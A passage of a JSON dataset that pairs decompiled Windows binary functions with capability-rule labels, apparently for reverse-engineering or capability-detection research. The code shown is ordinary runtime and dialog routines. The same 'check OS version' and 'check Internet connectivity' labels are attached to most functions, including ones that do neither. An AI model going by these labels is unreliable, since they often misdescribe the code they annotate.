unaff_EBP + -0x2a;\n                uVar1 = *(unaff_EBP + -0x2a);\n                while (((uVar1 != 0 && (puVar4[1] != 0)) &&\n                       ((**(unaff_EBP + 0x18) < *puVar4 || (puVar4[1] < **(unaff_EBP + 0x18)))))) {\n                    puVar4 = puVar4 + 2;\n                    uVar1 = *puVar4;\n                }\n            }\n            goto code_r0x00418111;\n        }\n    }\n    var_4ch = *(unaff_EBP + 0x20);\n    iVar6 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    *(unaff_EBP + -0x48) = iVar6;\n    if (iVar6 == 0) goto code_r0x00418111;\n    *(unaff_EBP + -4) = 0;\n    fcn.0040a2a0();\n    *(unaff_EBP + -0x18) = &fcn.00417d9e::var_4ch;\n    *(unaff_EBP + -0x34) = &fcn.00417d9e::var_4ch;\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + -0x34) == 0) {\n        iVar2 = fcn.00409f36();\n        *(unaff_EBP + -0x34) = iVar2;\n        if (iVar2 == 0) goto code_r0x00418111;\n        *(unaff_EBP + -0x3c) = 1;\n    }\n    unique0x00007a00 = *(unaff_EBP + 0x14);\n    _auStack48 = *(unaff_EBP + 0x10);\n    var_30h_2 = 1;\n    lpString1 = *(unaff_EBP + 0x20);\n    iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    if (iVar2 != 0) {\n        arg_8h_00 = &fcn.00417d9e::lpString1;\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                          (*(unaff_EBP + 0x20), 9, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), 0, 0);\n        *(unaff_EBP + -0x4c) = iVar2;\n        if (iVar2 != 0) {\n            *(unaff_EBP + -4) = 1;\n            fcn.0040a2a0();\n            *(unaff_EBP + -0x18) = &fcn.00417d9e::lpString1;\n            *(unaff_EBP + -0x50) = &fcn.00417d9e::lpString1;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x38) {\n                arg_8h_00 = fcn.00409f36(iVar2 * 2);\n                if (arg_8h_00 == NULL) goto code_r0x0041804c;\n                *(unaff_EBP + -0x44) = 1;\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                              (*(unaff_EBP + 0x20), 1, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), arg_8h_00, iVar2);\n            if (iVar5 != 0) {\n                uVar7 = (*_sym.imp.KERNEL32.dll_CompareStringW)\n                                  (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x34), iVar6, arg_8h_00, iVar2);\n                *(unaff_EBP + -0x40) = uVar7;\n            }\n            if (*(unaff_EBP + -0x44) != 0) {\n                fcn.00409f48(arg_8h_00);\n            }\n        }\n    }\ncode_r0x0041804c:\n    if (*(unaff_EBP + -0x3c) != 0) {\n        fcn.00409f48(*(unaff_EBP + -0x34));\n    }\ncode_r0x00418111:\n    *(unaff_EBP + -0x60) = 0x41811c;\n    fcn.0040b5c2();\n    *(unaff_EBP + -0x60) = 0x418121;\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 2863
    },
    "0041816f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * fcn.0041816f(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *unaff_EDI;\n    uint var_4h;\n    \n    iVar3 = 0;\n    if (unaff_EDI != NULL) {\n        iVar1 = *unaff_EDI;\n        piVar2 = unaff_EDI;\n        while (iVar1 != 0) {\n            piVar2 = piVar2 + 1;\n            iVar3 = iVar3 + 1;\n            iVar1 = *piVar2;\n        }\n        piVar2 = fcn.00409f36(iVar3 * 4 + 4);\n        if (piVar2 == NULL) {\n            fcn.0040b373(9);\n        }\n        iVar3 = *unaff_EDI;\n        piVar4 = piVar2;\n        while (iVar3 != 0) {\n            iVar3 = fcn.0040c96e(iVar3);\n            *piVar4 = iVar3;\n            piVar4 = piVar4 + 1;\n            unaff_EDI = unaff_EDI + 1;\n            iVar3 = *unaff_EDI;\n        }\n        *piVar4 = 0;\n        return piVar2;\n    }\n    return unaff_EDI;\n}\n",
        "token_count": 308
    },
    "00418518": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00418518(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint noname_3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    piVar2 = arg_ch;\n    if (arg_ch == NULL) {\n        iVar3 = fcn.0041443d();\n        var_ch = *(iVar3 + 8);\n        iVar3 = fcn.00414424();\n    }\n    else {\n        var_ch = *arg_ch;\n        iVar3 = arg_ch[1];\n    }\n    if (var_ch != 0) {\n        if (arg_8h < 0x100) {\n            if (piVar2 == NULL) {\n                iVar4 = fcn.0040fce3(arg_8h);\n                if (iVar4 == 0) {\n                    return arg_8h;\n                }\n            }\n            else if ((*(piVar2[2] + arg_8h * 2) & 1) == 0) {\n                return arg_8h;\n            }\n        }\n        iVar4 = fcn.0040f036();\n        uVar1 = arg_8h >> 8 & 0xff;\n        if ((*(iVar4 + 1 + uVar1 * 2) & 0x80) == 0) {\n            arg_ch = arg_ch & 0xffff0000 | arg_8h & 0xff;\n            noname_3 = 1;\n        }\n        else {\n            arg_ch._0_2_ = CONCAT11(arg_8h, uVar1);\n            arg_ch = arg_ch & 0xff000000 | arg_ch;\n            noname_3 = 2;\n        }\n        iVar3 = fcn.004110af(var_ch, 0x100, &arg_ch, noname_3, &var_4h, 3, iVar3, 1, unaff_EDI, unaff_EBX, unaff_ESI, \n                             iVar3, var_ch, arg_8h >> 8, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, \n                             in_stack_0000000c, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                             in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028);\n        if (iVar3 != 0) {\n            if (iVar3 == 1) {\n                arg_8h = var_4h & 0xff;\n            }\n            else {\n                arg_8h = CONCAT11(var_4h, var_4h._1_1_);\n            }\n        }\n        return arg_8h;\n    }\n    if (arg_8h < 0x41) {\n        return arg_8h;\n    }\n    if (0x5a < arg_8h) {\n        return arg_8h;\n    }\n    return arg_8h + 0x20;\n}\n",
        "token_count": 896
    },
    "004186af": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004186af(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        uVar1 = fcn.0040f0b9();\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar1);\n    }\n    else {\n        fcn.0040d355(0xc);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "0041875b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041875b(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        uVar1 = fcn.0040f0b9();\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar1);\n    }\n    else {\n        fcn.0040d355(0xc);\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "004187e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004187e6(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        uVar1 = fcn.0040f0b9();\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar1);\n    }\n    else {\n        fcn.0040d355(0xc);\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "00418983": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418983(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (*0x451544 == NULL) {\n        fcn.00419332(fcn.00418940);\n    }\n    piVar1 = fcn.0041bab6(8);\n    if (piVar1 == NULL) {\n        piVar1 = NULL;\n    }\n    else {\n        *piVar1 = *0x451544;\n        piVar1[1] = param_1;\n    }\n    *0x451544 = piVar1;\n    return;\n}\n",
        "token_count": 133
    },
    "00418f6d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00418f6d(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t noname_6;\n    int32_t iVar4;\n    uint noname_3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    bool bVar5;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    piVar2 = arg_ch;\n    if (arg_ch == NULL) {\n        iVar3 = fcn.0041443d();\n        iVar3 = *(iVar3 + 8);\n        noname_6 = fcn.00414424();\n    }\n    else {\n        iVar3 = *arg_ch;\n        noname_6 = arg_ch[1];\n    }\n    if (iVar3 == 0) {\n        if ((0x60 < arg_8h) && (arg_8h < 0x7b)) {\n            arg_8h = arg_8h - 0x20;\n        }\n    }\n    else {\n        if (arg_8h < 0x100) {\n            if (piVar2 == NULL) {\n                iVar4 = fcn.0040fd1d(arg_8h);\n                bVar5 = iVar4 == 0;\n            }\n            else {\n                bVar5 = (*(piVar2[2] + arg_8h * 2) & 2) == 0;\n            }\n            if (bVar5) {\n                return arg_8h;\n            }\n        }\n        iVar4 = fcn.0040f036();\n        uVar1 = arg_8h >> 8 & 0xff;\n        if ((*(iVar4 + 1 + uVar1 * 2) & 0x80) == 0) {\n            arg_ch = arg_ch & 0xffff0000 | arg_8h & 0xff;\n            noname_3 = 1;\n        }\n        else {\n            arg_ch._0_2_ = CONCAT11(arg_8h, uVar1);\n            arg_ch = arg_ch & 0xff000000 | arg_ch;\n            noname_3 = 2;\n        }\n        iVar3 = fcn.004110af(iVar3, 0x200, &arg_ch, noname_3, &var_4h, 3, noname_6, 1, unaff_EBX, unaff_EDI, unaff_ESI, \n                             noname_6, arg_8h >> 8, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, in_stack_0000000c\n                             , in_stack_00000010, in_stack_00000014, in_stack_00000018, in_stack_0000001c, \n                             in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c);\n        if (iVar3 != 0) {\n            if (iVar3 == 1) {\n                arg_8h = var_4h & 0xff;\n            }\n            else {\n                arg_8h = CONCAT11(var_4h, var_4h._1_1_);\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 909
    },
    "004190dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004190dc(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        uVar1 = fcn.0040f0b9();\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar1);\n    }\n    else {\n        fcn.0040d355(0xc);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "004197a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004197a4(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    uVar3 = 0;\n    uVar1 = fcn.0041686d(&var_10h, &var_1ch, arg_ch, 0, 0, 0, 0);\n    if ((uVar1 & 4) == 0) {\n        iVar2 = fcn.0041529b(&var_10h, &var_18h);\n        if (((uVar1 & 2) != 0) || (iVar2 == 1)) {\n            uVar3 = 0x80;\n        }\n        if (((uVar1 & 1) != 0) || (iVar2 == 2)) {\n            uVar3 = uVar3 | 0x100;\n        }\n    }\n    else {\n        uVar3 = 0x200;\n        var_18h = 0;\n        var_14h = 0;\n    }\n    *arg_8h = uVar3;\n    arg_8h[1] = var_1ch - arg_ch;\n    arg_8h[4] = var_18h;\n    arg_8h[5] = var_14h;\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 371
    },
    "00419aa4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00419aa4(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalLock;\n    if (param_1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        iVar4 = param_1;\n        puVar3 = (*_sym.imp.KERNEL32.dll_GlobalLock)(param_1);\n        if (param_1 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*pcVar1)(param_1);\n        }\n        if (puVar3 == NULL) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*_sym.imp.GDI32.dll_CreateDCA)(*puVar3 + puVar3, puVar3[1] + puVar3, puVar3[2] + puVar3, uVar2);\n            pcVar1 = _sym.imp.KERNEL32.dll_GlobalUnlock;\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(iVar4);\n            if (param_1 != 0) {\n                (*pcVar1)(param_1);\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 292
    },
    "00419b0f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.00419b0f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0041c343(0, *(unaff_EBP + 0x10));\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.CPrintDialog.0;\n    extraout_ECX[0x1c] = extraout_ECX + 0x1d;\n    fcn.0040bbe0(extraout_ECX + 0x1d, 0, 0x42);\n    *extraout_ECX[0x1c] = 0x42;\n    *(extraout_ECX[0x1c] + 0x14) = *(unaff_EBP + 0xc) | 0x3000;\n    iVar3 = fcn.0041c636();\n    if (iVar3 != 0) {\n        extraout_ECX[0x1c][0x15] = extraout_ECX[0x1c][0x15] | 8;\n    }\n    iVar3 = *(unaff_EBP + 8);\n    *(extraout_ECX[0x1c] + 0x2a) = fcn.0041a211;\n    *(extraout_ECX[0x1c] + 0x2e) = fcn.0041a211;\n    if (iVar3 == 0) {\n        extraout_ECX[0x14] = 0x7008;\n        pcVar2 = extraout_ECX[0x1c] + 0x15;\n        *pcVar2 = *pcVar2 | 1;\n    }\n    else {\n        extraout_ECX[0x14] = 0x7009;\n        puVar1 = extraout_ECX[0x1c] + 0x14;\n        *puVar1 = *puVar1 | 0x40;\n    }\n    extraout_ECX[0x1c][0x15] = extraout_ECX[0x1c][0x15] & 0xfd;\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 635
    },
    "00419cfb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00419cfb(int32_t param_1)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(*(param_1 + 0x70) + 0x1c));\n    bVar1 = false;\n    fcn.0040bbe0(*(*(param_1 + 0x70) + 0x1c) + iVar3 + 1, 0, *(*(param_1 + 0x70) + 0x20) - (iVar3 + 1));\n    (*_sym.imp.USER32.dll_GetFocus)();\n    iVar3 = *(param_1 + 0x70);\n    uVar4 = fcn.0041c50f();\n    *(iVar3 + 4) = uVar4;\n    fcn.0041ef5f();\n    pcVar2 = _sym.imp.USER32.dll_EnableWindow;\n    if (*(*(param_1 + 0x70) + 4) != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*(*(param_1 + 0x70) + 4));\n        if (iVar3 != 0) {\n            bVar1 = true;\n            (*pcVar2)(*(*(param_1 + 0x70) + 4), 0);\n        }\n    }\n    iVar3 = fcn.00434fd8();\n    if ((*(*(param_1 + 0x70) + 0x36) & 8) == 0) {\n        fcn.00420590(param_1);\n    }\n    else {\n        *(iVar3 + 0x18) = param_1;\n    }\n    if (*(param_1 + 0x74) == 0) {\n        (*_sym.imp.comdlg32.dll_GetSaveFileNameA)(*(param_1 + 0x70));\n    }\n    else {\n        (*_sym.imp.comdlg32.dll_GetOpenFileNameA)();\n    }\n    *(iVar3 + 0x18) = 0;\n    if (bVar1) {\n        (*pcVar2)(*(*(param_1 + 0x70) + 4), 1);\n    }\n    iVar3 = (*_sym.imp.USER32.dll_IsWindow)(unaff_EBP);\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_SetFocus)(unaff_ESI);\n    }\n    fcn.0041c549();\n    if (unaff_EBP == 0) {\n        unaff_EBP = 2;\n    }\n    return unaff_EBP;\n}\n",
        "token_count": 605
    },
    "00419f29": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_a8h\n// WARNING: Variable defined which should be unmapped: var_a0h\n// WARNING: Variable defined which should be unmapped: lpVersionInformation\n\nvoid __cdecl\nfcn.00419f29(uint arg_8h, uint arg_ch, uint lpString2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    code **ppcVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_a8h;\n    uint lpVersionInformation;\n    uint var_a0h;\n    uint var_94h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = *0x44e0fc;\n    *(unaff_EBP + -0xa8) = extraout_ECX;\n    fcn.0041c343(0, *(unaff_EBP + 0x1c));\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.CFileDialog.0;\n    fcn.00402330();\n    *(unaff_EBP + -4) = 1;\n    if (*(unaff_EBP + 0x20) == 0) {\n        fcn.0040bbe0(unaff_EBP + -0xa4, 0, 0x94);\n        *(unaff_EBP + -0xa4) = 0x94;\n        (*_sym.imp.KERNEL32.dll_GetVersionExA)(unaff_EBP + -0xa4);\n        if ((*(unaff_EBP + -0x94) != 2) || (*(unaff_EBP + 0x20) = 0x58,  *(unaff_EBP + -0xa0) < 5)) {\n            *(unaff_EBP + 0x20) = 0x4c;\n        }\n    }\n    pcVar5 = fcn.00409f36(*(unaff_EBP + 0x20));\n    extraout_ECX[0x1c] = pcVar5;\n    if (pcVar5 == NULL) {\n        pcVar5 = fcn.004198b2();\n    }\n    fcn.0040bbe0(pcVar5, 0, *(unaff_EBP + 0x20));\n    pcVar5 = *(unaff_EBP + 8);\n    uVar2 = *(unaff_EBP + 0x20);\n    extraout_ECX[0x1d] = pcVar5;\n    extraout_ECX[0x14] = 0x7005 - (pcVar5 != NULL);\n    extraout_ECX[0x70] = NULL;\n    *(extraout_ECX + 0x1f) = 0;\n    ppcVar1 = extraout_ECX + 0x2f;\n    *ppcVar1 = 0;\n    *extraout_ECX[0x1c] = uVar2;\n    uVar2 = *(unaff_EBP + 0xc);\n    *(extraout_ECX[0x1c] + 0x1c) = ppcVar1;\n    *(extraout_ECX[0x1c] + 0x20) = 0x104;\n    *(extraout_ECX[0x1c] + 0x3c) = uVar2;\n    uVar3 = *(unaff_EBP + 0x14);\n    *(extraout_ECX[0x1c] + 0x24) = extraout_ECX + 0x1f;\n    *(extraout_ECX[0x1c] + 0x28) = 0x40;\n    *(extraout_ECX[0x1c] + 0x34) = *(extraout_ECX[0x1c] + 0x34) | uVar3 | 0x80020;\n    if ((*(unaff_EBP + 0x14) & 0x40) != 0) {\n        extraout_ECX[0x1c][0x36] = extraout_ECX[0x1c][0x36] & 0x7f;\n    }\n    iVar6 = fcn.00434fe8();\n    iVar4 = *(unaff_EBP + 0x10);\n    *(extraout_ECX[0x1c] + 8) = *(iVar6 + 0xc);\n    *(extraout_ECX[0x1c] + 0x44) = fcn.0041a211;\n    if (iVar4 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(ppcVar1, *(unaff_EBP + 0x10), 0x104);\n    }\n    if (*(unaff_EBP + 0x18) != 0) {\n        fcn.00403860(*(unaff_EBP + 0x18));\n        puVar7 = fcn.004026d0(0);\n        while( true ) {\n            puVar7 = fcn.0040c38a(puVar7, 0x7c);\n            if (puVar7 == NULL) break;\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *(extraout_ECX[0x1c] + 0xc) = extraout_ECX[0x1e];\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 1309
    },
    "0041a0c9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0041a0c9(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    uVar1 = *(*(extraout_ECX + 0x70) + 0x36);\n    *(unaff_EBP + -0x14) = 0;\n    if (((uVar1 & 8) != 0) && (*(extraout_ECX + 0x1c) != 0)) {\n        piVar3 = fcn.0041bc88();\n        iVar4 = (**(*piVar3 + 0xc))();\n        *(unaff_EBP + -0x10) = iVar4 + 0x10;\n        pcVar2 = _sym.imp.USER32.dll_GetParent;\n        uVar6 = *(extraout_ECX + 0x1c);\n        *(unaff_EBP + -4) = 0;\n        uVar5 = (*pcVar2)(uVar6);\n        uVar5 = fcn.0041eeb7(uVar5);\n        *(unaff_EBP + -0x14) = uVar5;\n        uVar5 = fcn.004026d0(0x104);\n        iVar4 = (*_sym.imp.USER32.dll_SendMessageA)(*(*(unaff_EBP + -0x14) + 0x1c), 0x464, 0x104, uVar5);\n        if (iVar4 < 0) {\n            fcn.004014a0();\n        }\n        else {\n            fcn.00407fe0(uVar6, 0xffffffff);\n        }\n        if (*(*(unaff_EBP + -0x10) + -0xc) != 0) {\n            uVar6 = (*pcVar2)(*(extraout_ECX + 0x1c));\n            iVar4 = fcn.0041eeb7(uVar6);\n            uVar6 = fcn.004026d0(0x104);\n            iVar4 = (*_sym.imp.USER32.dll_SendMessageA)(*(iVar4 + 0x1c), 0x465, 0x104, uVar6);\n            if (-1 < iVar4) {\n                fcn.00407fe0(0xffffffff);\n                fcn.004026b0(unaff_EBP + -0x10);\n                fcn.00401180();\n                goto code_r0x0041a1ac;\n            }\n            fcn.004014a0();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00401180();\n    }\n    fcn.00406c60(*(*(extraout_ECX + 0x70) + 0x1c));\ncode_r0x0041a1ac:\n    uVar6 = *(unaff_EBP + 8);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar6;\n}\n",
        "token_count": 779
    },
    "0041a3ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0041a3ac(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    iVar1 = fcn.0043500e();\n    if ((*(iVar1 + 0x24) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0041baa4(0x426e5d);\n        iVar3 = fcn.0041bab6(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00423296(0x4427c8, 0x43867c, 0x435f2c, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x24) = uVar4;\n        fcn.0041baa4(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x24);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 369
    },
    "0042331a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
